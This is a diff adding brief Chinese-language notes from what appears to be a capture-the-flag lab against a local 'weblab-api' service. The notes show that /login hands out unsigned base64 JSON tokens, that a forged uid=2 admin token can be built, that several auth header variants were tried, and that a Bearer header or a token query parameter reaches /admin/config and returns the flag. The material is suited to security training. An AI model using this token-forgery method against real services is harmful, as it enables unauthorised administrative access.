@@ -1,0 +1,22 @@
+GET http://127.0.0.1:18081/  -> {"service":"weblab-api","endpoints":["/login","/notes?id=","/admin/config","/files?name="],"hint":"token=base64({json uid}) ; notes?id= may not check ownership"}
+
+弱 token：/login 不校验凭据，恒发 uid=1 的 token，且无签名（token = base64(json)）：
+GET /login           -> {"token":"eyJ1aWQiOiAiMSIsICJ1c2VyIjogIiJ9","uid":"1"}
+GET /login?user=bob  -> {"token":"eyJ1aWQiOiAiMSIsICJ1c2VyIjogImJvYiJ9","uid":"1"}
+
+伪造 admin token（uid=2 在 USERS 中 role=admin）：
+  python: base64.b64encode(b'{"uid": "2"}') = eyJ1aWQiOiAiMiJ9
+
+鉴权尝试（均 {"error":"admin only"}）：
+  -H "Authorization: eyJ1aWQiOiAiMiJ9"（无 Bearer）
+  -H "X-Token / Token / X-Auth-Token / X-Api-Token / Cookie: token="
+  -H "Authorization: Bearer <uid=1 token>"
+  -H "Authorization: Bearer <伪造 uid=0 token>"
+
+成功（无 Bearer 前缀失败，Bearer 前缀通过）：
+GET http://127.0.0.1:18081/admin/config -H "Authorization: Bearer eyJ1aWQiOiAiMiJ9"
+  -> {"flag": "FLAG{api_chain_ok}", "debug": true}
+GET http://127.0.0.1:18081/admin/config?token=eyJ1aWQiOiAiMiJ9
+  -> {"flag": "FLAG{api_chain_ok}", "debug": true}
+
+无 token 访问 /admin/config -> {"error":"admin only"}（HTTP 403）
